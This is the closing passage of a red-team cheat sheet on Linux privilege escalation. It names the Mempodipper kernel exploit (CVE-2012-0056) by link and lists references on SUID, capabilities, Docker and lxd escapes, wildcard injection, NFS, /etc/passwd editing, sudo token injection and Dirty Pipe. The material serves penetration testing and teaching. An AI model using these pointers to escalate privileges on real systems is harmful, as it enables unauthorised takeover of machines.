  ```\n\n### CVE-2012-0056 (Mempodipper)\n\nLinux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)\n\n```powershell\nhttps://www.exploit-db.com/exploits/18411\n\
  ```\n\n## References\n\n* [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)\n\
  * [Privilege escalation via Docker - April 22, 2015 - Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)\n\
  * [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)\n\
  * [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)\n\
  * [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)\n* [Back\
  \ To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)\n\
  * [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)\n\
  * [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)\n* [Editing /etc/passwd File\
  \ for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)\n\
  * [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)\n\
  \n* [Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)\n\
  * [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)\n\
  * [SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md)\n\
  * [The Dirty Pipe Vulnerability](https://dirtypipe.cm4all.com/)\n* [Setting the root password in preseed.cfg for unattended\
  \ installation - Sebest - Mar 31, 2010](https://sebest.github.io/post/setting-the-root-password-in-preseed-cfg-for-unattended-installation/)"
_relative_path: redteam/escalation/linux-privilege-escalation.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/escalation/linux-privilege-escalation.md
````
